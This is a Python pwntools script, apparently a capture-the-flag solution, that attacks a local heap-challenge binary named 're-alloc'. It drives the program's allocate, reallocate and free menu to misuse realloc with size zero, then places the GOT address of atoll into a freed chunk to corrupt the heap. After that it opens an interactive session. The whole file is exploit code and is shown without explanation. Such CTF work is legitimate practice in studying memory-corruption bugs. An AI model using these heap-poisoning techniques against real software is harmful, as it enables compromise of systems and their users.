from pwn import *
p = process("./re-alloc")
elf = ELF("./re-alloc")
libc = elf.libc
pause()
def alloc(idx, size, data):
    p.sendlineafter(":", "1")
    p.sendlineafter(":", str(idx))
    p.sendlineafter(":", str(size))
    p.sendlineafter(":", data)

def realloc(idx, size, data):
    p.sendlineafter(":", "2")
    p.sendlineafter(":", str(idx))
    p.sendlineafter(":", str(size))
    if(size >= 1):
        p.sendlineafter(":", data)

def free(idx):
    p.sendlineafter(":", "3")
    p.sendlineafter(":", str(idx))

alloc(0, 0x20, "a" * 0x20)
realloc(0, 0, "a")
realloc(0, 0x20, "a" * 0x20)
realloc(0, 0, "a")
realloc(0, 0x20, p64(elf.got['atoll']))
alloc(1, 0x20, "a" * 0x20)
realloc(0, 0x38, "a" * 0x28)
free(0)
realloc(1, 0x48, "a" * 0x48)
free(1)
p.interactive()
